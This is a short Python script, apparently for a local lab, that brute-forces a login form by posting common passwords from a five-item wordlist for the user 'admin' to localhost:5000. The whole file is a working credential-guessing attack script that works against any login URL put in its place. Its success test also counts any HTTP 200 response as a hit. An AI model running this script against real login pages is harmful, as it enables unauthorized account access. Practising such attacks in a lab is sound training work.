import requests

def brute_force_sim(url, username, wordlist):
    for pwd in wordlist:
        r = requests.post(url,
            data={"username": username, "password": pwd},
            timeout=5)
        
        if "Welcome" in r.text or r.status_code == 200:
            print(f"[+] FOUND: {username}:{pwd}")
            return pwd
        else:
            print(f"[-] Failed: {pwd}")
    
    print("[!] Password not found in wordlist")
    return None

if __name__ == "__main__":
    wordlist = ["123456", "password", "admin", "letmein", "qwerty"]
    print("\n=== Brute Force Simulation (Local Lab Only) ===\n")
    brute_force_sim("http://localhost:5000/login", "admin", wordlist)